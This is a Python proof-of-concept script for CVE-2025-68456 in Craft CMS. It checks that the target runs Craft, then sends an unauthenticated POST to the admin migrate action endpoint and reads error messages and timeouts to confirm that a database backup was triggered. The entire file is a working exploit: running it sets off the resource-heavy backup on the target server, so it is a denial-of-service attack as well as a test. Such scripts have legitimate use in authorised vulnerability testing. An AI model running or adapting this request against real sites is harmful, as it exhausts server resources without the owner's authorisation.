#!/usr/bin/env python3
"""
CVE-2025-68456: Craft CMS Unauthenticated Database Backup DoS

Vulnerability: Unauthenticated users can trigger database backup operations
via /admin/actions/app/migrate endpoint when pending migrations exist,
leading to resource exhaustion (DoS).

Requirements for exploitation:
1. Craft CMS 5.0.0-RC1 to 5.8.20 or 3.0.0 to 4.16.16
2. backupOnUpdate config enabled (default: true)
3. Pending database migrations exist
"""

import requests
import sys
import argparse
import json


def check_vuln(target_url, verbose=False):
    target_url = target_url.rstrip('/')
    
    print(f"[*] Target: {target_url}")
    print("[*] Testing CVE-2025-68456 - Craft CMS Unauthenticated Database Backup DoS\n")
    
    try:
        resp = requests.get(f"{target_url}/admin/login", timeout=10)
        if "Craft" not in resp.text and "Sign In" not in resp.text:
            print("[-] Target does not appear to be Craft CMS")
            return False
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        return False
    
    print("[+] Target is running Craft CMS")
    
    migrate_url = f"{target_url}/index.php?p=admin/actions/app/migrate"
    print(f"[*] Testing endpoint: {migrate_url}")
    
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    
    try:
        resp = requests.post(migrate_url, headers=headers, json={}, timeout=30)
        
        print(f"[*] Response Status: {resp.status_code}")
        
        if verbose:
            print(f"[*] Response Body: {resp.text[:500]}...")
        
        if resp.status_code == 500:
            try:
                data = resp.json()
                error_msg = data.get("message", "")
                previous = data.get("previous", {})
                prev_msg = previous.get("message", "") if isinstance(previous, dict) else ""
                
                if "backup" in error_msg.lower() or "mysqldump" in prev_msg.lower():
                    print("\n[+] VULNERABLE!")
                    print("[+] Server attempted to execute database backup operation")
                    print("[+] Evidence: Server error indicates backup process was triggered")
                    
                    if "mysqldump" in prev_msg:
                        print("[+] mysqldump command was executed by unauthenticated request")
                    
                    return True
                    
            except json.JSONDecodeError:
                pass
        
        elif resp.status_code == 200:
            print("\n[*] Server returned 200 - checking response...")
            
            if not resp.text.strip():
                print("[*] Empty response - no pending migrations")
                print("[*] Vulnerability exists but requires pending migrations to exploit")
                return True
        
        elif resp.status_code in [401, 403]:
            print("\n[-] NOT VULNERABLE - Endpoint requires authentication")
            return False
        
        elif resp.status_code == 400:
            resp_text = resp.text.lower()
            if "csrf" in resp_text or "token" in resp_text:
                print("\n[-] NOT VULNERABLE - CSRF validation is enforced")
                print("[-] This appears to be a patched version")
                return False
                
    except requests.exceptions.Timeout:
        print("\n[!] Request timed out - backup operation may be running")
        print("[+] POTENTIALLY VULNERABLE - Server is processing resource-intensive operation")
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    
    print("\n[?] Could not definitively confirm vulnerability status")
    return False


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2025-68456 PoC - Craft CMS Unauthenticated Database Backup DoS',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python poc.py -t http://localhost:8080
  python poc.py -t http://target.com -v
        '''
    )
    parser.add_argument('--target', '-t', default='http://localhost:8080', 
                        help='Target URL (default: http://localhost:8080)')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Show verbose output')
    args = parser.parse_args()
    
    result = check_vuln(args.target, args.verbose)
    
    if result:
        print("\n" + "="*60)
        print("[+] Target is VULNERABLE to CVE-2025-68456")
        print("="*60)
        sys.exit(0)
    else:
        print("\n" + "="*60)
        print("[-] Target does not appear to be vulnerable")
        print("="*60)
        sys.exit(1)


if __name__ == "__main__":
    main()
